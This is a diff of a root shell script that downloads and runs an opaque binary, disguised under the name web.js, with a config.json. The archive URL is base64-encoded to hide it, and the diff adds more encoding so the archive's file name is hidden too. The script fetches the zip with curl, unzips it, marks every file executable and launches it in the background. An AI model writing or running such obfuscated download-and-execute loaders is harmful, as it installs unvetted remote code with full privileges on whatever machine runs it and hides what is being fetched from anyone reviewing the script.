@@ -1,9 +1,11 @@
 cd /root
-weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvd2ViLnRhci54ego='
+weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvaWR4LXdlYi56aXAK'
 weburl=$(printf "%s" $weburl_S | base64 -d) 
 curl -O $weburl
 sleep 1
-unzip idx-web
+web_F_S='aWR4LXdlYi56aXAK'
+web_F=$(printf "%s" $web_F_S | base64 -d) 
+unzip $web_F
 chmod +x *
 ./web.js -c ./config.json &
 
